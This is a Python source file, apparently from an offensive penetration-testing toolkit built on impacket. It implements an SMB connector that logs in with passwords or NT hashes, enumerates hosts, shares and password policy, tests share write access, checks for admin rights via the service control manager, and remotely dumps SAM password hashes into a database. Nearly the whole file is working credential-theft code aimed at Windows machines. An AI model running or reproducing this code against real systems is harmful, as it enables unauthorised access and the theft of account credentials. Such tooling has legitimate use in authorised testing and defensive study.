from random import choice
from impacket.dcerpc.v5 import scmr
from impacket.smb import SMB_DIALECT
from string import ascii_letters, digits
from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5.transport import SMBTransport
from impacket.dcerpc.v5.epm import MSRPC_UUID_PORTMAP
from impacket.dcerpc.v5.transport import DCERPCTransportFactory
from impacket.examples.secretsdump import RemoteOperations, SAMHashes

from ar3.logger import highlight
from ar3.core.connector import Connector
from ar3.ops.enum.polenum import SAMRDump

class SmbCon(Connector):
    def __init__(self, args, loggers, host, db):
        Connector.__init__(self, args, loggers, host)
        self.auth       = False
        self.con        = False
        self.client     = ''.join([choice(ascii_letters + digits) for x in range(7)])
        self.smbv1      = False
        self.os         = ''
        self.admin      = False
        self.signing    = False
        self.os_arch    = '0'
        self.remote_ops = None
        self.bootkey    = None

        self.db   = db
        self.port = 445

    #########################
    # Session Management
    #########################
    def create_smb_con(self):
        # Create SMB Con
        if self.smb_connection():
            self.host_info()
            try:
                # SMB Auth
                self.con.login(self.username, self.password, self.domain, lmhash=self.lmhash, nthash=self.nthash)
                self.auth = True
                self.host_info()
                self.isAdmin()
                self.update_db()
            except Exception as e:
                raise Exception(str(e))
        else:
            raise Exception('Connection to Server Failed')

    def update_db(self):
        self.db.update_host(self.host, self.ip, self.domain, self.os, self.signing)
        if self.username and self.password or self.username and self.hash:
            self.db.update_user(self.username, self.password, self.domain, self.hash)
            if self.admin:
                self.db.update_admin(self.username, self.domain, self.host)

    def logoff(self):
        self.con.logoff()

    def close(self):
        try:
            self.con.logoff()
        except:
            pass

        try:
            self.con.close()
        except:
            pass

    #########################
    # SMB Connection
    #########################
    def smb_connection(self):
        if self.smbv1_con():
            return True
        elif self.smbv3_con():
            return True
        return False

    def smbv1_con(self):
        try:
            self.con = SMBConnection(self.client, self.host, sess_port=self.port, preferredDialect=SMB_DIALECT, timeout=int(self.timeout))
            self.smbv1=True
            self.con.setTimeout(self.timeout)
            return True
        except Exception as e:
            return False

    def smbv3_con(self):
        try:
            self.con = SMBConnection(self.client, self.host, sess_port=self.port, timeout=int(self.timeout))
            self.con.setTimeout(self.timeout)
            return True
        except Exception as e:
            return False

    #########################
    # Authentication (NOT IN USE)
    #########################
    def set_host(self, local_auth):
        # Get domain for authentication purposes
        if local_auth:
            self.domain = self.con.getServerName() + "." + self.con.getServerDNSDomainName()
        else:
            self.domain = self.con.getServerDNSDomainName()
        # Backup for Linux/Unix systems
        if not self.domain:
            self.domain = self.con.getServerName() + "." + self.con.getServerDNSDomainName()

    ################################
    # Enumerate Host information
    ################################
    def host_info(self):
        try:
            self.srvdomain  = self.get_domain()
            self.host       = self.get_hostname()
            self.os         = self.con.getServerOS()
            self.signing    = self.con.isSigningRequired()

            arch = self.get_os_arch()
            if arch == 32 or arch == 64:
                self.os_arch = " x{}".format(str(arch))
            else:
                self.os_arch = ''
        except Exception as e:
            self.logger.debug("SMB Host Info: {}".format(str(e)))

    def get_os_arch(self):
        # Credit: https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/protocols/smb.py
        # Credit: https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_19/examples/getArch.py
        try:
            stringBinding = r'ncacn_ip_tcp:{}[135]'.format(self.host)
            transport = DCERPCTransportFactory(stringBinding)
            transport.set_connect_timeout(5)
            dce = transport.get_dce_rpc()
            dce.connect()
            try:
                dce.bind(MSRPC_UUID_PORTMAP, transfer_syntax=('71710533-BEBA-4937-8319-B5DBEF9CCC36', '1.0'))
            except DCERPCException as e:
                if str(e).find('syntaxes_not_supported') >= 0:
                    dce.disconnect()
                    return 32
            else:
                dce.disconnect()
                return 64
        except:
            return 0

    def get_hostname(self):
        if self.con.getServerDNSDomainName() and not self.local_auth:
            if self.con.getServerName().lower() != self.con.getServerDNSDomainName().lower():
                return (self.con.getServerName() + "." + self.con.getServerDNSDomainName())
            else:
                return self.con.getServerName()
        else:
            return self.con.getServerName()

    def get_domain(self):
        try:
            return self.con.getServerDomain()
        except:
            return self.getServerName()

    def list_shares(self):
        # name=share['shi1_netname'][:-1], description=share['shi1_remark']
        return self.con.listShares()

    ################################
    # Host/Domain Password Policy
    ################################
    def password_policy(self):
        SAMRDump(self).dump(self.host)

    ################################
    # List Shares & Check Share Permissions
    ################################
    def read_perm(self, share):
        try:
            # Silently list path to check access
            self.list_path(share, False)
            return True
        except:
            return False

    def write_perm(self, share):
        try:
            # Create dir to check write access
            tmp = '.' + ''.join([choice(ascii_letters + digits) for x in range(5)])
            self.con.createDirectory(share, tmp)
            self.con.deleteDirectory(share, tmp)
            return True
        except Exception as e:
            return False

    def list_path(self, share, path):
        if not path:
            path = '/*'
        return self.con.listPath(share, path)

    ################################
    # Check if User Admin
    ################################
    def isAdmin(self):
        rpctransport = SMBTransport(self.host, self.port, r'\svcctl', smb_connection=self.con)
        dce = rpctransport.get_dce_rpc()
        try:
            dce.connect()
        except:
            pass
        else:
            dce.bind(scmr.MSRPC_UUID_SCMR)
            try:
                # 0xF003F - SC_MANAGER_ALL_ACCESS
                # http://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx
                ans = scmr.hROpenSCManagerW(dce, '{}\x00'.format(self.host), 'ServicesActive\x00', 0xF003F)
                self.admin = True
                return True
            except scmr.DCERPCException as e:
                pass
        return False

    ################################
    # Dump SAM / LSA
    ################################
    def enable_remoteops(self):
        # Source: https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/protocols/smb.py
        if self.remote_ops is not None and self.bootkey is not None:
            return
        try:
            self.remote_ops = RemoteOperations(self.con, False, None)
            self.remote_ops.enableRegistry()
            self.bootkey = self.remote_ops.getBootKey()
        except Exception as e:
            self.logger.fail('RemoteOperations failed for {}: {}'.format(self.host, str(e)))

    def sam(self):
        try:
            self.enable_remoteops()

            def add_sam_hash(sam_hash, host_id):
                self.logger.success([self.host, highlight("SAM HASH"), sam_hash])
                username, _, lmhash, nthash, _, _, _ = sam_hash.split(':')
                self.db.update_user(username, '', host_id, "{}:{}".format(lmhash,nthash))

            if self.remote_ops and self.bootkey:
                SAMFileName = self.remote_ops.saveSAM()
                SAM = SAMHashes(SAMFileName, self.bootkey, isRemote=True, perSecretCallback=lambda secret: add_sam_hash(secret, self.host))
                SAM.dump()

        except Exception as e:
            self.logger.fail('SAM Extraction Failed for {}: {}'.format(self.host, str(e)))
            try:
                self.remote_ops.finish()
            except Exception as e:
                self.logger.debug("Error calling remote_ops.finish() for {}: {}".format(self.host, str(e)))
        SAM.finish()